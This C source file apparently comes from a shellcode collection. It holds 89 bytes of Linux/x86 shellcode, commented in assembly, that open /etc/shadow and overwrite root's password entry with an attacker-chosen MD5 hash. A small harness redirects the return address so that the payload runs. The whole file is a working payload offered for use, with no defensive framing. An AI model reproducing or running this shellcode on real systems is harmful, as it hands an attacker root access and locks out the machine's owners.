/*
 | Title: Linux/x86 pwrite("/etc/shadow", hash, 32, 8) Shellcode 89 Bytes
 | Description: replace root's password with hash of "agix" in MD5
 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

#include <stdio.h>

char shellcode[] =
"\x31\xC9"            		//xor ecx,ecx
"\x51"              		//push ecx
"\x68\x61\x64\x6F\x77"   	//push dword 0x776f6461
"\x68\x63\x2F\x73\x68"      	//push dword 0x68732f63
"\x68\x2F\x2F\x65\x74" 		//push dword 0x74652f2f
"\x89\xE3"               	//mov ebx,esp
"\x66\xB9\x91\x01"         	//mov cx,0x191
"\x31\xC0"               	//xor eax,eax
"\xB0\x05"               	//mov al,0x5
"\xCD\x80"               	//int 0x80
"\x89\xC3"               	//mov ebx,eax
"\xEB\x12" 			//jmp short 0x34
"\x59" 				//pop ecx
"\x31\xC0"               	//xor eax,eax
"\x31\xD2"               	//xor edx,edx
"\xB2\x20"               	//mov dl,0x20
"\xB0\xB5"               	//mov al,0xb5
"\x31\xF6"               	//xor esi,esi
"\x6A\x08"            		//push byte +0x8
"\x5E"                 		//pop esi
"\x31\xFF"               	//xor edi,edi
"\xCD\x80"               	//int 0x80
"\xE8\xE9\xFF\xFF\xFF"      	//call 0x22
//db "IMMkmgi9$NuhPs1B8H5uz7kEOeKf2H1:"
"\x49\x4D\x4D\x6B\x6D\x67\x69\x39"
"\x24\x4E\x75\x68\x50\x73\x31\x42"
"\x38\x48\x35\x75\x7A\x37\x6B\x45"
"\x4F\x65\x4B\x66\x32\x48\x31\x3A";

int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}